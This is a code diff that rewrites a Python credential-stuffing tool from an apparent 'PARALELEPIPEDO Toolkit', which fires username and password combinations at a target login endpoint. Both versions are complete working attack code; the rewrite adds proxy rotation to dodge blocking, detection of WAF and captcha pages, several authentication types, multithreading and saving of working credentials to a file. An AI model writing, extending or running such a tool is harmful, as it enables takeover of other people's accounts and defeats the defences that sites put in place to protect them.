@@ -1,79 +1,178 @@
-# language: Python 3, file: credential_stuffing.py, target: Windows/Linux
-# Credential stuffing — tests user:pass combos from a file against a login endpoint.
-# Combo file format: user:password (one per line)
-import requests
+#!/usr/bin/env python3
+# =============================================================================
+# Filename: credential_stuffing.py
+# Description: Credential stuffing tool with proxy rotation, rate limiting,
+#              WAF/captcha detection, and multiple auth types (form/json/basic).
+# Author: PARALELEPIPEDO Toolkit
+# =============================================================================
+
+import argparse
+import json
+import re
 import threading
-import queue
 import time
+from base64 import b64encode
+from itertools import cycle
+from queue import Queue
 
-THREADS = 20
-TIMEOUT = 8
-DELAY = 0.3
+import requests
+from colorama import Fore, Style, init
 
-valid = []
-lock = threading.Lock()
+init(autoreset=True)
 
-def try_login(url, method, user_field, pass_field, success_string, fail_string, combo, session):
-    user, pwd = combo.split(':', 1)
-    data = {user_field: user, pass_field: pwd}
+CAPTCHA_INDICATORS = [
+    "captcha", "recaptcha", "cloudflare", "challenge", "bot protection",
+    "ddos", "access denied", "ray id", "cf-ray"
+]
+
+
+def load_lines(filepath):
+    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+        return [line.strip() for line in f if line.strip()]
+
+
+def detect_waf(response):
+    code = response.status_code
+    if code in (403, 429):
+        return True
+    body = response.text.lower()
+    for indicator in CAPTCHA_INDICATORS:
+        if indicator in body:
+            return True
+    return False
+
+
+def try_credential(url, username, password, user_field, pass_field,
+                   auth_type, success_pattern, proxy, session):
+    proxies = {"http": proxy, "https": proxy} if proxy else None
     try:
-        if method.upper() == 'POST':
-            r = session.post(url, data=data, timeout=TIMEOUT, allow_redirects=True)
-        else:
-            r = session.get(url, params=data, timeout=TIMEOUT, allow_redirects=True)
-        hit = False
-        if success_string and success_string in r.text:
-            hit = True
-        elif fail_string and fail_string not in r.text:
-            hit = True
-        if hit:
-            with lock:
-                valid.append(f'{user}:{pwd}')
-                print(f'[VALID] {user}:{pwd} (status={r.status_code})')
-    except Exception as e:
-        pass
-    time.sleep(DELAY)
+        if auth_type == "basic":
+            token = b64encode(f"{username}:{password}".encode()).decode()
+            headers = {"Authorization": f"Basic {token}"}
+            resp = session.get(url, headers=headers, proxies=proxies, timeout=10, allow_redirects=True)
+        elif auth_type == "json":
+            body = {user_field: username, pass_field: password}
+            resp = session.post(url, json=body, proxies=proxies, timeout=10, allow_redirects=True)
+        else:  # form
+            body = {user_field: username, pass_field: password}
+            resp = session.post(url, data=body, proxies=proxies, timeout=10, allow_redirects=True)
 
-def worker(q, url, method, uf, pf, success, fail):
+        if detect_waf(resp):
+            return "waf", resp
+
+        if success_pattern:
+            if re.search(success_pattern, resp.text, re.IGNORECASE):
+                return "success", resp
+        else:
+            if resp.status_code in (200, 302):
+                return "success", resp
+
+        return "fail", resp
+
+    except Exception as e:
+        return "error", str(e)
+
+
+def worker(args, combo_queue, proxy_cycle, semaphore, results, lock):
     session = requests.Session()
-    while not q.empty():
+    while not combo_queue.empty():
         try:
-            combo = q.get_nowait()
-        except queue.Empty:
-            return
-        try_login(url, method, uf, pf, success, fail, combo, session)
-        q.task_done()
+            username, password = combo_queue.get_nowait()
+        except Exception:
+            break
+
+        with semaphore:
+            proxy = next(proxy_cycle) if proxy_cycle else None
+            status, resp = try_credential(
+                args.url, username, password,
+                args.user_field, args.pass_field,
+                args.auth_type, args.success_pattern,
+                proxy, session
+            )
+
+            if status == "success":
+                print(f"{Fore.GREEN}[+] SUCCESS  {username}:{password}{Style.RESET_ALL}")
+                with lock:
+                    results.append({"username": username, "password": password, "url": args.url})
+            elif status == "waf":
+                print(f"{Fore.YELLOW}[!] WAF/CAPTCHA  {username}:{password} (proxy={proxy}){Style.RESET_ALL}")
+            elif status == "error":
+                print(f"{Fore.RED}[E] ERROR    {username}:{password} => {resp}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}[-] FAIL     {username}:{password}{Style.RESET_ALL}")
+
+            if args.delay > 0:
+                time.sleep(args.delay)
+
+        combo_queue.task_done()
+
 
 def main():
-    url = input('Login endpoint URL: ').strip()
-    method = input('HTTP method (POST/GET): ').strip().upper() or 'POST'
-    user_field = input('Username field name (ex: username): ').strip()
-    pass_field = input('Password field name (ex: password): ').strip()
-    combo_file = input('Combo list path (user:pass format): ').strip()
-    success_str = input('Success string in response (blank to skip): ').strip()
-    fail_str = input('Failure string in response (blank to skip): ').strip()
+    parser = argparse.ArgumentParser(
+        description="PARALELEPIPEDO - Credential Stuffing Tool",
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter
+    )
+    parser.add_argument("--url", required=True, help="Target login URL")
+    parser.add_argument("--userlist", required=True, help="File with usernames")
+    parser.add_argument("--passlist", required=True, help="File with passwords")
+    parser.add_argument("--user-field", default="username", help="Form username field name")
+    parser.add_argument("--pass-field", default="password", help="Form password field name")
+    parser.add_argument("--auth-type", choices=["form", "json", "basic"], default="form",
+                        help="Authentication type")
+    parser.add_argument("--threads", type=int, default=5, help="Number of threads")
+    parser.add_argument("--delay", type=float, default=0.5,
+                        help="Seconds delay between requests per thread")
+    parser.add_argument("--proxy-list", help="File with proxies (one per line)")
+    parser.add_argument("--output-file", help="JSON output file for successful credentials")
+    parser.add_argument("--success-pattern", help="Regex pattern indicating login success")
+    args = parser.parse_args()
 
-    with open(combo_file, 'r', errors='ignore') as f:
-        combos = [l.strip() for l in f if ':' in l.strip()]
+    print(f"{Fore.CYAN}[*] PARALELEPIPEDO Credential Stuffing{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}[*] Target : {args.url}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}[*] Auth   : {args.auth_type}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}[*] Threads: {args.threads}{Style.RESET_ALL}")
 
-    print(f'[*] Testing {len(combos)} combos against {url} | {THREADS} threads\n')
-    q = queue.Queue()
-    for c in combos:
-        q.put(c)
+    users = load_lines(args.userlist)
+    passwords = load_lines(args.passlist)
 
+    proxies = []
+    if args.proxy_list:
+        proxies = load_lines(args.proxy_list)
+        print(f"{Fore.CYAN}[*] Proxies: {len(proxies)} loaded{Style.RESET_ALL}")
+
+    proxy_cycle = cycle(proxies) if proxies else None
+    combo_queue = Queue()
+    for u in users:
+        for p in passwords:
+            combo_queue.put((u, p))
+
+    total = combo_queue.qsize()
+    print(f"{Fore.CYAN}[*] Combos : {total}{Style.RESET_ALL}\n")
+
+    results = []
+    lock = threading.Lock()
+    semaphore = threading.Semaphore(args.threads)
     threads = []
-    for _ in range(THREADS):
+
+    for _ in range(args.threads):
         t = threading.Thread(
             target=worker,
-            args=(q, url, method, user_field, pass_field, success_str, fail_str),
+            args=(args, combo_queue, proxy_cycle, semaphore, results, lock),
             daemon=True
         )
         t.start()
         threads.append(t)
-    q.join()
-    print(f'\n[+] Valid credentials found: {len(valid)}')
-    for v in valid:
-        print(f'  {v}')
 
-if __name__ == '__main__':
+    for t in threads:
+        t.join()
+
+    print(f"\n{Fore.CYAN}[*] Done. {len(results)} credential(s) found.{Style.RESET_ALL}")
+
+    if args.output_file and results:
+        with open(args.output_file, "w", encoding="utf-8") as f:
+            json.dump(results, f, indent=2)
+        print(f"{Fore.GREEN}[+] Results saved to {args.output_file}{Style.RESET_ALL}")
+
+
+if __name__ == "__main__":
     main()
